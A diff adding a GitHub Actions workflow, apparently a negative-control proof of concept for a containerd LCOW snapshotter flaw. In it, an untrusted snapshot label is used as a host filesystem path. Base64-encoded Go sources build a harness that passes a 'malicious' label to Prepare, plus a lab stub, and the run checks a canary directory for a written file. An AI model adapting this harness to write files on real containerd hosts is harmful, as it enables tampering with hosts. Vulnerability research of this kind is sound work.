@@ -1,0 +1,90 @@
+name: D17 LCOW PoC NEGATIVE CONTROL
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: windows-latest
+    timeout-minutes: 25
+    steps:
+      - name: Download containerd 2.4.2 and prep dirs
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $base = 'C:\ctdpoc'
+          New-Item -ItemType Directory -Force -Path "$base\bin", "$base\root", "$base\state", "$base\canary", "$base\go", "$base\stub" | Out-Null
+          Write-Output "CANARY_BEFORE:"
+          Get-ChildItem "$base\canary" -Force | Select-Object Name,Length | Format-Table
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          Get-ChildItem "$base\bin\bin" | Select-Object Name,Length | Format-Table
+
+      - name: Write containerd config + Go sources
+        shell: pwsh
+        run: |
+          $cfg = 'dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwo='
+          [System.IO.File]::WriteAllBytes('C:\ctdpoc\config.toml', [System.Convert]::FromBase64String($cfg))
+          $gomod = 'bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'
+          [System.IO.File]::WriteAllBytes('C:\ctdpoc\go\go.mod', [System.Convert]::FromBase64String($gomod))
+          $gomn = 'cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiZm10IgogICAgIm9zIgoKICAgICJnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92Mi9jbGllbnQiCiAgICAiZ2l0aHViLmNvbS9jb250YWluZXJkL2NvbnRhaW5lcmQvdjIvY29yZS9zbmFwc2hvdHMiCikKCmZ1bmMgbWFpbigpIHsKICAgIC8vIGFyZ3M6IDxhZGRyZXNzPiA8bmFtZXNwYWNlPiA8c25hcHNob3R0ZXI+IDxrZXk+IDxsYWJlbC1rZXk+IDxsYWJlbC12YWx1ZT4KICAgIGlmIGxlbihvcy5BcmdzKSA8IDcgewogICAgICAgIGZtdC5QcmludGxuKCJuZWVkIDYgYXJncyIpCiAgICAgICAgb3MuRXhpdCgyKQogICAgfQogICAgYWRkciwgbnMsIHNuYXAsIGtleSwgbGssIGx2IDo9IG9zLkFyZ3NbMV0sIG9zLkFyZ3NbMl0sIG9zLkFyZ3NbM10sIG9zLkFyZ3NbNF0sIG9zLkFyZ3NbNV0sIG9zLkFyZ3NbNl0KICAgIGN0eCA6PSBjb250ZXh0LkJhY2tncm91bmQoKQogICAgYywgZXJyIDo9IGNsaWVudC5OZXcoYWRkciwgY2xpZW50LldpdGhEZWZhdWx0TmFtZXNwYWNlKG5zKSkKICAgIGlmIGVyciAhPSBuaWwgewogICAgICAgIGZtdC5QcmludGxuKCJjbGllbnQgZXJyOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBkZWZlciBjLkNsb3NlKCkKCiAgICAvLyBUaGlzIG1pcnJvcnMgQ1JJIFJ1blBvZFNhbmRib3g6IHVudHJ1c3RlZCBwb2QgYW5ub3RhdGlvbnMgYXJlIHBhc3NlZAogICAgLy8gdmVyYmF0aW0gYXMgc25hcHNob3QgbGFiZWxzIHRvIFNuYXBzaG90dGVyLlByZXBhcmUgdmlhIFdpdGhMYWJlbHMuCiAgICBtYWxpY2lvdXMgOj0gbWFwW3N0cmluZ11zdHJpbmd7bGs6IGx2fQogICAgc3MgOj0gYy5TbmFwc2hvdFNlcnZpY2Uoc25hcCkKICAgIG1vdW50cywgZXJyIDo9IHNzLlByZXBhcmUoY3R4LCBrZXksICIiLCBzbmFwc2hvdHMuV2l0aExhYmVscyhtYWxpY2lvdXMpKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LlByaW50bG4oIlBSRVBBUkVfRVJSOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmbXQuUHJpbnRsbigiUFJFUEFSRV9PSyBtb3VudHM6IiwgbW91bnRzKQp9Cg=='
+          [System.IO.File]::WriteAllBytes('C:\ctdpoc\go\main.go', [System.Convert]::FromBase64String($gomn))
+          $stub = 'Ly9nbzpidWlsZCB3aW5kb3dzCgovLyBydW5oY3Nfc3R1Yi5nbyAtIExBQiBIQVJORVNTIGZvciB0aGUgSHlwZXItVi1kZXBlbmRlbnQgcnVuaGNzLmV4ZSBoZWxwZXIuCi8vIEltcGxlbWVudHMgdGhlIG5hcnJvdyBpbnRlcmZhY2UgY29udGFpbmVyZCdzIExDT1cgc25hcHNob3R0ZXIgdXNlczoKLy8gICBydW5oY3MuZXhlIDxnbG9iYWwgZmxhZ3M+IGNyZWF0ZS1zY3JhdGNoIC0tZGVzdHBhdGggPHBhdGg+Ci8vIEl0IGNyZWF0ZXMgYSBmaWxlIGF0IDxwYXRoPiAoYSBzdGFuZC1pbiBmb3IgdGhlIGV4dDQgVkhEWCB0aGF0IGdlbnVpbmUKLy8gcnVuaGNzIHByb2R1Y2VzIHZpYSBhIFVWTSkuIFRoaXMgaXMgTk9UIHRoZSB2dWxuZXJhYmlsaXR5IC0gdGhlIHZ1bG5lcmFibGUKLy8gY29kZSBpcyBjb250YWluZXJkJ3MgdXNlIG9mIGFuIGF0dGFja2VyLWNvbnRyb2xsZWQgbGFiZWwgYXMgYSBmaWxlc3lzdGVtCi8vIHBhdGgsIHdoaWNoIHJ1bnMgZm9yIHJlYWwgaW4gdGhpcyBQb0MuCnBhY2thZ2UgbWFpbgoKaW1wb3J0ICgKICAgICJmbXQiCiAgICAib3MiCikKCmZ1bmMgbWFpbigpIHsKICAgIGRlc3QgOj0gIiIKICAgIGZvciBpLCBhIDo9IHJhbmdlIG9zLkFyZ3MgewogICAgICAgIGlmIGEgPT0gIi0tZGVzdHBhdGgiICYmIGkrMSA8IGxlbihvcy5BcmdzKSB7CiAgICAgICAgICAgIGRlc3QgPSBvcy5BcmdzW2krMV0KICAgICAgICB9CiAgICB9CiAgICBpZiBkZXN0ID09ICIiIHsKICAgICAgICBmbXQuRnByaW50bG4ob3MuU3RkZXJyLCAicnVuaGNzIHN0dWI6IC0tZGVzdHBhdGggcmVxdWlyZWQiKQogICAgICAgIG9zLkV4aXQoMSkKICAgIH0KICAgIGYsIGVyciA6PSBvcy5PcGVuRmlsZShkZXN0LCBvcy5PX0NSRUFURXxvcy5PX1dST05MWXxvcy5PX1RSVU5DLCAwNjAwKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LkZwcmludGxuKG9zLlN0ZGVyciwgInJ1bmhjcyBzdHViOiBvcGVuOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICAvLyBtaW5pbWFsIFZIRFgtbGlrZSBwbGFjZWhvbGRlciBjb250ZW50ICg1MTIgYnl0ZXMpCiAgICBidWYgOj0gbWFrZShbXWJ5dGUsIDUxMikKICAgIGNvcHkoYnVmLCBbXWJ5dGUoImNvbnRhaW5lZCB2aXJ0YWwgZGlzayBwbGFjZWhvbGRlciAobGFiIGhhcm5lc3MpIikpCiAgICBpZiBfLCBlcnIgOj0gZi5Xcml0ZShidWYpOyBlcnIgIT0gbmlsIHsKICAgICAgICBmLkNsb3NlKCkKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmLkNsb3NlKCkKICAgIGZtdC5QcmludGxuKCJydW5oY3Mgc3R1YjogY3JlYXRlZCIsIGRlc3QpCn0K'
+          [System.IO.File]::WriteAllBytes('C:\ctdpoc\stub\main.go', [System.Convert]::FromBase64String($stub))
+          Set-Content -Path 'C:\ctdpoc\stub\go.mod' -Value "module stub`n`ngo 1.24" -Encoding ascii
+          Write-Output '=== config ==='
+          Get-Content 'C:\ctdpoc\config.toml'
+
+      - name: Build harness + runhcs lab stub
+        shell: pwsh
+        run: |
+          $env:GO111MODULE='on'
+          Set-Location 'C:\ctdpoc\go'
+          go mod tidy 2>&1 | Tee-Object -FilePath 'C:\ctdpoc\gomod.out'
+          go build -o 'C:\ctdpoc\poc.exe' . 2>&1 | Tee-Object -FilePath 'C:\ctdpoc\build.out'
+          Write-Output "BUILD_POC_EXIT=$LASTEXITCODE"
+          Set-Location 'C:\ctdpoc\stub'
+          go build -o 'C:\ctdpoc\bin\bin\runhcs.exe' . 2>&1 | Tee-Object -FilePath 'C:\ctdpoc\stubbuild.out'
+          Write-Output "BUILD_STUB_EXIT=$LASTEXITCODE"
+          Get-Item 'C:\ctdpoc\poc.exe','C:\ctdpoc\bin\bin\runhcs.exe' -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-Table
+
+      - name: Start daemon + trigger malicious Prepare + capture (single step)
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Continue'
+          $base = 'C:\ctdpoc'
+          $loc = 'C:\ctdpoc\canary'
+          $labelKey = 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.NOTTHEKEY'
+          $env:PATH = "C:\ctdpoc\bin\bin;$env:PATH"
+          $p = Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
+          Write-Output "CONTAINERD_PID=$($p.Id)"
+          Start-Sleep -Seconds 8
+          Write-Output '--- alive? ---'
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          Write-Output '--- plugins ---'
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'snapshotter'
+          Write-Output "=== malicious label: $labelKey = $loc ==="
+          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-sandbox' $labelKey $loc 2>&1 | Tee-Object -FilePath "$base\prepare.out"
+          Write-Output "POC_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 3
+          Write-Output '=== CANARY AFTER ==='
+          Get-ChildItem $loc -Force | Select-Object Name,Length,LastWriteTime | Format-Table
+          $probe = Join-Path $loc 'scratch.vhdx'
+          Write-Output "HOST_FILE_WRITTEN=$(Test-Path $probe)"
+          if (Test-Path $probe) { Get-Item $probe | Select-Object FullName,Length,LastWriteTime | Format-List; Get-FileHash $probe -Algorithm SHA256 | Format-List }
+          Write-Output '=== daemon stderr tail ==='
+          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 30 }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-neg-evidence
+          path: |
+            C:\ctdpoc\prepare.out
+            C:\ctdpoc\build.out
+            C:\ctdpoc\stubbuild.out
+            C:\ctdpoc\gomod.out
+            C:\ctdpoc\stderr.log
+            C:\ctdpoc\stdout.log
+            C:\ctdpoc\config.toml
+          if-no-files-found: warn
